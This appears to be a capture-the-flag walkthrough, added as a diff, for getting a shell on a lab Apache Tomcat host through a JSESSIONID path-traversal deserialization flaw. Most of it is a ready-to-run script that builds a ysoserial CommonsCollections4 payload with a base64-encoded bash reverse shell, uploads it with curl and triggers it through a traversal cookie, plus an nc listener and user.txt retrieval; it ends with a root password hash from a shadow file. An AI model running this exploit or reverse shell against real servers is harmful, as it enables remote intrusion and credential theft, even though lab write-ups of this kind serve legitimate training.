@@ -1,0 +1,47 @@
+first download ysoserial from https://github.com/frohoff/ysoserial
+-> scroll down to installation, there should be a link (https://jitpack.io/com/github/frohoff/ys...APSHOT.jar)
+-> name it ysoserial.jar
+-> put it in the same folder where you will put the next script
+
+
+use this script to get shell:
+filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
+ip=$1
+port=$2
+cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+jex="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
+java -jar ysoserial.jar CommonsCollections4 "$jex" > /tmp/$filename.session
+curl -s -F "data=@/tmp/$filename.session" http://10.10.10.205:8080/upload.jsp?email=test@mail.com > /dev/null
+curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null
+
+
+start nc listener:
+nc -lvnp <port>
+
+run the script with your ip and port like this:
+shell.sh <ip> <port>
+
+then you can get user.txt with:
+cat ~/user.txt
+
+explanation:
+1. apache tomcat vulnerability in jsessionid (https://www.redtimmy.com/java-hacking/ap...d-exploit/)
+    -> read the post, it says we can use ysoserial to serialize payload, which we can then execute via vulnerability
+2. running reverse shell normally wont work because of javas Runtime.exec(), so we have to create a workaround (http://www.jackson-t.ca/runtime-exec-payloads.html)
+    -> try by entering normal payload e.g. bash -i >& /dev/tcp/<ip>/<port> 0>&1
+
+
+
+You can give me some credits for this if you like (if you click on unlock, theres nothing in there)
+
+
+root:$6$XzluqBeUpIVqOvGi$1ngfZ.wa2hueUAkXFZjRZIyNxuQBboMC5319WC1lQcZORfGF6aKiG1mmnHaNnhFDTLeUknAre9ofC1KD/KvaU0:18430:0:99999:7:::
+
+
+
+
+
+
+
+
+
